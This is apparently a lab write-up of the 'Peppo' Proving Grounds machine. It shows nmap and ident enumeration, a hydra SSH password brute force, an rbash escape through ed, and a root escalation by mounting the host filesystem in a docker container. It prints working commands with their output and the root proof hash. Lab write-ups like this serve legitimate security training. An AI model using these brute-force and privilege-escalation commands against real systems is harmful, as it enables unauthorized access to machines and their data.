### Peppo Proving Grounds Practice

### Difficulty = Hard

### IP Address = 192.168.168.60

Nmap Scan:

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Peppo]                                                                                                                                                                      
└─$ nmap -sCV 192.168.168.60 -p22,113,5432,8080,10000 -oN nmapscan -Pn                                                                                                                                            
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-27 03:17 WAT                                                                                                                                                   
Nmap scan report for 192.168.168.60                                                                                                                                                                               
Host is up (0.20s latency).                                                                                                                                                                                       
                                                                                                                                                                                                                  
PORT      STATE SERVICE           VERSION                                                                                                                                                                         
22/tcp    open  ssh               OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)                                                                                                                                   
|_auth-owners: root                                                                                                                                                                                               
| ssh-hostkey:                                                                                                                                                                                                    
|   2048 75:4c:02:01:fa:1e:9f:cc:e4:7b:52:fe:ba:36:85:a9 (RSA)                                                                                                                                                    
|   256 b7:6f:9c:2b:bf:fb:04:62:f4:18:c9:38:f4:3d:6b:2b (ECDSA)                                                                                                                                                   
|_  256 98:7f:b6:40:ce:bb:b5:57:d5:d1:3c:65:72:74:87:c3 (ED25519)                                                                                                                                                 
113/tcp   open  ident             FreeBSD identd                                                                                                                                                                  
|_auth-owners: nobody                                                                                                                                                                                             
5432/tcp  open  postgresql        PostgreSQL DB 9.6.0 or later                                                                                                                                                    
| fingerprint-strings:                                                                                                                                                                                            
|   SMBProgNeg:                                                                                                                                                                                                   
|     SFATAL                                                                                                                                                                                                      
|     VFATAL                                                                                                                                                                                                      
|     C0A000                                                                                                                                                                                                      
|     Munsupported frontend protocol 65363.19778: server supports 2.0 to 3.0                                                                                                                                      
|     Fpostmaster.c                                                                                                                                                                                               
|     L2071                                                                                                                                                                                                       
|_    RProcessStartupPacket                                                                                                                                                                                       
8080/tcp  open  http              WEBrick httpd 1.4.2 (Ruby 2.6.6 (2020-03-31))                                                                                                                                   
| http-robots.txt: 4 disallowed entries                                                                                                                                                                           
|_/issues/gantt /issues/calendar /activity /search                                                                                                                                                                
|_http-title: Redmine                                                                                                                                                                                             
|_http-server-header: WEBrick/1.4.2 (Ruby/2.6.6/2020-03-31)                                                                                                                                                       
10000/tcp open  snet-sensor-mgmt?                                                                                                                                                                                 
| fingerprint-strings:                                                                                                                                                                                            
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, Ter
minalServerCookie, X11Probe:                                                                                                                                                                                      
|     HTTP/1.1 400 Bad Request                                                                                                                                                                                    
|     Connection: close                                                                                                                                                                                           
|   FourOhFourRequest:                                                                                                                                                                                            
|     HTTP/1.1 200 OK                                                                                                                                                                                             
|     Content-Type: text/plain                                                                                                                                                                                    
|     Date: Fri, 27 Jan 2023 02:18:10 GMT                                                                                                                                                                         
|     Connection: close                                                                                                                                                                                           
|     Hello World                                                                                                                                                                                                 
|   GetRequest:                                                                                                                                                                                                   
|     HTTP/1.1 200 OK                                                                                                                                                                                             
|     Content-Type: text/plain                                                                                                                                                                                    
|     Date: Fri, 27 Jan 2023 02:17:59 GMT                                                                                                                                                                         
|     Connection: close                                                                                                                                                                                           
|     Hello World
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-Type: text/plain
|     Date: Fri, 27 Jan 2023 02:18:00 GMT
|     Connection: close
|_    Hello World
|_auth-owners: eleanor
```

From the scan we can tell its os distro is `Linux FreeBSD`

So on port 113 we have a service running on it which is `ident` 

Checking google i found a way to enumerate ident service [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/113-pentesting-ident)

So we can use a tool called `Ident-user-enum` which will query the ident service (113/TCP) in order to determine the owner of the process listening on each TCP port of a target system.

So lets run it on the target

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Peppo]
└─$ ident-user-enum 192.168.168.60 22 113 5432 8080 10000
ident-user-enum v1.0 ( http://pentestmonkey.net/tools/ident-user-enum )

192.168.168.60:22       root
192.168.168.60:113      nobody
192.168.168.60:5432     <unknown>
192.168.168.60:8080     <unknown>
192.168.168.60:10000    eleanor
```

We get 3 users which are root,nobody & eleanor

Lets brute force ssh password for user eleanor since that seems like a valid path to take

Now using hydra to brute force eleanor password 

After few minutes we get a hit 

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Peppo]
└─$ hydra -L users -P /home/mark/Documents/rockyou.txt ssh://192.168.168.60 -t64
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-27 03:28:57
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://192.168.168.60:22/
[STATUS] 444.00 tries/min, 444 tries in 00:01h, 14343988 to do in 538:27h, 31 active
[STATUS] 228.00 tries/min, 684 tries in 00:03h, 14343755 to do in 1048:32h, 24 active
[22][ssh] host: 192.168.168.60   login: eleanor   password: eleanor
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-01-27 03:37:28
```

We should have just guessed that lol 

Now lets login using the credential `eleanor:eleanor`

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Peppo]
└─$ ssh eleanor@192.168.168.60          
The authenticity of host '192.168.168.60 (192.168.168.60)' can't be established.
ED25519 key fingerprint is SHA256:GrHKbhpl4waMainGkiieqFVD5jgXi12zVmCIya8UR7M.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.168.60' (ED25519) to the list of known hosts.
eleanor@192.168.168.60's password: 
Linux peppo 4.9.0-12-amd64 #1 SMP Debian 4.9.210-1 (2020-01-20) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
eleanor@peppo:~$ 
```

Cool!!! Lets get root now

On trying to run command i get an error saying command not found

```
eleanor@peppo:~$ clear
-rbash: clear: command not found
eleanor@peppo:~$ id
-rbash: id: command not found
eleanor@peppo:~$ id
-rbash: id: command not found
eleanor@peppo:~$
```

Now this is rbash doings 😂

```
eleanor@peppo:~$ echo $SHELL
/bin/rbash

```

Anyways this can be easily bypassed in this case

```
eleanor@peppo:~$ echo $PATH
/home/eleanor/bin
eleanor@peppo:~$ ls bin
chmod  chown  ed  ls  mv  ping  sleep  touch
eleanor@peppo:~$
```

We see the available commands that can be ran 

And a weird one which is `ed`

Now searching for ed shows its a text editor just like vim,nano etc. 
![image](https://user-images.githubusercontent.com/113513376/214999039-a7d0202a-55d4-4d90-a382-944b411ef09d.png)

Also [gtfobins](https://gtfobins.github.io/gtfobins/ed/#shell) has a shell escape command

So lets bypass this then 😎

```
eleanor@peppo:~$ ed
!/bin/sh
$ id
/bin/sh: 1: id: not found
$ echo $PATH
/home/eleanor/bin
$ export PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:$PATH
$ id
uid=1000(eleanor) gid=1000(eleanor) groups=1000(eleanor),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),999(docker)
$ 
```

Now we have a better shell 

Lets escalate priv to root 

If you notice the user's group we see she's among the `docker` group

This can be abused to get shell as root

Firstly lets check the avaiable docker images in the system

```
$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
redmine             latest              0c8429c66e07        2 years ago         542MB
postgres            latest              adf2b126dda8        2 years ago         313MB
$ 
```

Here's the payload

```
docker run -v /:/mnt --rm -it 0c8429c66e07 chroot /mnt sh
```

Now lets get shell

```
$ docker run -v /:/mnt --rm -it 0c8429c66e07 chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls -al
total 20
drwx------  2 root root 4096 Jan 26 21:14 .
drwxr-xr-x 22 root root 4096 May 25  2020 ..
-rw-------  1 root root    0 Aug  6  2020 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   33 Jan 26 21:15 proof.txt
# cat proof.txt
1c9062946750e3b8a4e02c070758b2f4
# 
```

And we're done 


<br> <br>
[Back To Home](../../index.md)
<br>
                                 

